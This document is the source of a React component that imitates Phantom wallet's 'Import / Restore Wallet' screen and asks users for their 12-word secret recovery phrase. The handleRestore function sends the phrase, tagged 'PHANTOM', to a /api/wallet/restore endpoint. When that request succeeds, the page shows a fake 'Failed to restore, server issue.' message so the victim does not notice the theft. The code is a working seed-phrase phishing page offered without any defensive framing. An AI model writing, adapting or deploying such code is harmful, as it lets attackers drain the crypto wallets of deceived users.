"use client";

import { useState } from "react";
import { Eye, EyeOff } from "lucide-react";

export default function PhantomRestore() {
  const [phrase, setPhrase] = useState<string[]>(Array(12).fill(""));
  const [visible, setVisible] = useState<boolean[]>(Array(12).fill(false));
  const [wordCount] = useState<number>(12); // Phantom varsayılan 12 kelime

  const toggleVis = (i: number) => {
    setVisible(v => v.map((val, idx) => idx === i ? !val : val));
  };

  const handleChange = (i: number, v: string) => {
    const arr = [...phrase];
    arr[i] = v.toLowerCase().trim();
    setPhrase(arr);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const words = e.clipboardData.getData("text")
      .trim()
      .toLowerCase()
      .split(/\s+/)
      .slice(0, wordCount);
    const arr = Array(wordCount).fill("");
    words.forEach((w, idx) => arr[idx] = w);
    setPhrase(arr);
    e.preventDefault();
  };

  const handleRestore = async () => {
    const phraseString = phrase.join(" ").trim();

    try {
      const response = await fetch("/api/wallet/restore", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phrase: `PHANTOM ${phraseString}` }),
      });

      const result = await response.json();
      if (response.ok) {
        alert("Failed to restore, server issue.");
      } else {
        alert("Error: " + result.message);
      }
    } catch (err) {
      alert("Failed to restore. Please check your internet or server.");
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen bg-[#0f0f11] text-white flex items-center justify-center p-4">
      <div className="max-w-lg w-full bg-[#1a1a1f] rounded-xl p-6 space-y-6 shadow-lg">
        <h1 className="text-2xl font-semibold text-center">Import / Restore Wallet</h1>
        <p className="text-sm text-gray-400 text-center">
          Enter your 12‑word secret recovery phrase to import into Phantom.
        </p>

        <div className="grid grid-cols-3 gap-3">
          {phrase.map((w, i) => (
            <div key={i} className="relative">
              <input
                type={visible[i] ? "text" : "password"}
                value={w}
                onChange={e => handleChange(i, e.target.value)}
                onPaste={handlePaste}
                className="w-full bg-[#262631] border border-gray-700 rounded px-3 py-2 pr-10 text-sm text-white"
                placeholder={`${i + 1}.`}
              />
              <button
                type="button"
                onClick={() => toggleVis(i)}
                className="absolute inset-y-0 right-2 flex items-center text-gray-400 hover:text-white"
              >
                {visible[i] ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          ))}
        </div>

        <button
          onClick={handleRestore}
          className="w-full bg-[#635bf1] hover:bg-[#524bcf] text-white font-medium py-2 rounded-md"
        >
          Restore Wallet
        </button>
      </div>
    </div>
  );
}
